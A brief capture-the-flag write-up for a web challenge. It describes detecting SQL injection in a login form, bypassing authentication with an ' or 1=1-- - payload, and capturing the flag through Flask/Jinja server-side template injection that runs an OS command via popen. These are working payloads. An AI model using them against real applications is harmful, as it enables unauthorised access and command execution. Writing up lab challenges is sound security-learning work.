#### s1mple
- points earned: 328
#### Notes
- This one was relatively easy and I'm shocked more teams didn't get this one.
- The login form is vulnerable to SQL injection which I was able to verify with 2 different tests.
	- I used username and password `!@#$%^&*()=-+_\][|}{';":/.,?><` and got an error `- Error: You can only execute one statement at a time.`
	- I removed the `;` from that username/password and then got the error `- Error: near "":/.,?><' and password='!@#$%^&*()=-+_\][|}{'"": syntax error` which looks like an sql error.
- The `/page?search_item=` endpoint is vulnerable to SSTI.  I was able to verify this by sending `{{4*4}}` and observing that the output was `16`.

#### Solution
- Use the SQL injection vulnerability to bypass authentication with username `' or 1=1-- -` and any password.
	- I didn't see much indication of other endpoints (other then `/dashboard`) in the app so I spent some time here dumping the DB.  However, this didn't yield anything usefull.
- I ffuf'd for other endpoints and found `/dashboard`, `profile`, and `page`
- After determining that `/page` us vulnerable to SSTI I was able to capture the flag with a pretty standard Flask/Jinja template injection below.
	`{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /app/flag.txt').read()}}`